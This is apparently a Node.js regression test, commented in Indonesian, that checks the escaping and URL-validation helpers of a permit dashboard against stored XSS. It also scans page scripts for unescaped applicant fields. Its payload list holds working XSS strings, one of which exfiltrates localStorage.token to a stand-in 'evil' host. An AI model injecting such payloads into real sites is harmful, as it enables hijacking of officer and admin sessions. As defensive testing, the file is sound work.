/**
 * Test regresi untuk celah Stored XSS.
 *
 * Pemohon mengendalikan nomor_berkas, nama_pemohon, alamat_lokasi, dan
 * koordinat_maps. Nilai-nilai itu ditampilkan di dasbor petugas dan admin.
 * Sebelum diperbaiki, semuanya masuk ke innerHTML tanpa di-escape sehingga
 * pemohon biasa bisa menjalankan skrip di sesi petugas/admin dan mencuri token.
 *
 * Test ini memuat helper yang BENAR-BENAR dipakai halaman (public/js/common.js)
 * dan memastikan pola berbahaya tetap tertutup.
 */
const assert = require('assert');
const fs = require('fs');
const path = require('path');
const vm = require('vm');

const root = path.join(__dirname, '..');

// Muat common.js apa adanya, seperti browser memuatnya.
const sandbox = { console };
vm.createContext(sandbox);
vm.runInContext(
    fs.readFileSync(path.join(root, 'public/js/common.js'), 'utf8'),
    sandbox,
    { filename: 'public/js/common.js' }
);
const { escapeHTML, stripHTML, safeMapsUrl, safeWhatsAppUrl, formatDate } = sandbox;

const PAYLOADS = [
    '<img src=x onerror=alert(1)>',
    '"><script>fetch("//evil/"+localStorage.token)</script>',
    "' onmouseover='alert(1)",
    '</strong><svg onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '&lt;img src=x onerror=alert(1)&gt;'
];

function testEscapeHTML() {
    for (const payload of PAYLOADS) {
        const out = escapeHTML(payload);
        assert.ok(!/[<>"']/.test(out), `escapeHTML meloloskan karakter aktif: ${payload}`);
        assert.ok(!out.includes('<script'), `escapeHTML meloloskan tag script: ${payload}`);
    }
    // Nilai kosong tidak boleh menjadi teks "null"/"undefined" di layar.
    assert.strictEqual(escapeHTML(null), '');
    assert.strictEqual(escapeHTML(undefined), '');
    assert.strictEqual(escapeHTML(0), '0', 'angka 0 harus tetap tampil, bukan jadi kosong');
}

function testStripHTML() {
    assert.strictEqual(stripHTML('<b>Berkas</b> 123'), 'Berkas 123');
    assert.strictEqual(stripHTML(null), '');
}

function testSafeMapsUrl() {
    // Pemeriksaan lama `koordinat.includes('http')` tembus oleh payload ini.
    const ditolak = [
        'javascript:alert(1)//http',
        'JavaScript:alert(1)//http',
        'http://evil.test/curi',
        '" onmouseover="alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '999,999',
        '-91,0',
        '0,181',
        ''
    ];
    for (const nilai of ditolak) {
        assert.strictEqual(safeMapsUrl(nilai), null, `safeMapsUrl seharusnya menolak: ${nilai}`);
    }

    const url = safeMapsUrl('-2.5489,121.3456');
    assert.ok(url.startsWith('https://www.google.com/maps?q='), 'koordinat sah harus diterima');
    assert.ok(!/[<>"']/.test(url), 'URL peta tidak boleh memuat karakter aktif');
}

function testSafeWhatsAppUrl() {
    assert.strictEqual(safeWhatsAppUrl('081234567890'), 'https://wa.me/6281234567890');
    assert.strictEqual(safeWhatsAppUrl('bukan-nomor'), null);
    assert.strictEqual(safeWhatsAppUrl('"><script>'), null);
}

function testFormatDateTidakBergeser() {
    // Kolom DATE dikirim sebagai 'YYYY-MM-DD'. Tanggalnya tidak boleh bergeser
    // walau zona waktu proses berada di sebelah barat UTC.
    const semula = process.env.TZ;
    try {
        process.env.TZ = 'America/New_York';
        assert.ok(
            formatDate('2026-08-20').includes('20'),
            'tanggal DATE bergeser saat zona waktu klien di barat UTC'
        );
        assert.strictEqual(formatDate(null), '-');
    } finally {
        if (semula === undefined) delete process.env.TZ;
        else process.env.TZ = semula;
    }
}

/**
 * Penjaga statis: setiap data pemohon yang masuk ke innerHTML harus lewat
 * escapeHTML. Ini yang mencegah celah lama muncul lagi diam-diam.
 */
function testTidakAdaInterpolasiMentah() {
    const BERBAHAYA = [
        'nomor_berkas', 'nama_pemohon', 'alamat_lokasi', 'koordinat_maps',
        'catatan_lapangan', 'no_telepon', 'nama_user', 'email_user', 'nip'
    ];
    const berkas = ['public/js/admin.js', 'public/js/petugas.js', 'public/js/user.js'];
    const temuan = [];

    for (const relatif of berkas) {
        const isi = fs.readFileSync(path.join(root, relatif), 'utf8');
        const baris = isi.split('\n');
        baris.forEach((teks, index) => {
            for (const field of BERBAHAYA) {
                // Interpolasi `${x.field}` atau `${x.field || '-'}` tanpa pembungkus.
                const pola = new RegExp('\\$\\{[A-Za-z_$][\\w$]*\\.' + field + "\\b(?:\\s*\\|\\|\\s*'[^']*')?\\s*\\}");
                if (pola.test(teks)) {
                    temuan.push(`${relatif}:${index + 1}  ${teks.trim().slice(0, 100)}`);
                }
            }
        });
    }

    assert.deepStrictEqual(
        temuan, [],
        'Ada data pemohon yang masuk ke template tanpa escapeHTML:\n' + temuan.join('\n')
    );
}

testEscapeHTML();
testStripHTML();
testSafeMapsUrl();
testSafeWhatsAppUrl();
testFormatDateTidakBergeser();
testTidakAdaInterpolasiMentah();

console.log('XSS escaping regression: OK');
